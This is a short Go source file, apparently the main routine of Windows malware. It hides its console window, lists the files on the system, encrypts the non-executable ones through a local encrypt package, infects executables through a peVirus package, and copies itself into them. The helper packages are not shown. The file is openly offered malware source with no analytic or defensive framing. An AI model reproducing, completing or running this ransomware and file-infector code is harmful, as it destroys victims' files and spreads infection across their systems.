package main

import (
	"os"
	"strings"

	"github.com/AllenDang/w32"

	"./encrypt"
	"./fileSystem"
	"./peVirus"
)

func main() {
	console := w32.GetConsoleWindow()
	if console != 0 {
		w32.ShowWindow(console, w32.SW_HIDE)
	}
	ffname := os.Args[0]
	ok := strings.HasSuffix(ffname, ".exe")
	if !ok {
		ffname += ".exe"
	}
	othFile, peFile := fileSystem.GetAllFile(ffname)
	encrypt.Run(othFile)
	x64File := peVirus.Infect(peFile)
	peVirus.SelfCopy(x64File, ffname)
}
